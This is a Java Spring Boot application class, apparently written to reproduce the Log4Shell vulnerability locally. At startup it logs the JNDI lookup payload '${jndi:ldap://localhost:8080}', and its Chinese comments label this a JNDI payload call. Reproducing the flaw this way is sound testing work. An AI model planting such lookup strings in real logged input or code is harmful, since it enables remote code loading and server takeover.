package com.atguigu.mybatis_plus;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;

/**
 * @author 17872
 */
@SpringBootApplication
public class MybatisPlusApplication {


    // 增加 log4j LOGGER 对象的定义
    private static final Logger LOGGER = (Logger) LogManager.getLogger();

    public static void main(String[] args) {
        // 增加 JNDI Payload 的调用
        LOGGER.error("${jndi:ldap://localhost:8080}");
        SpringApplication.run(MybatisPlusApplication.class, args);
    }
}
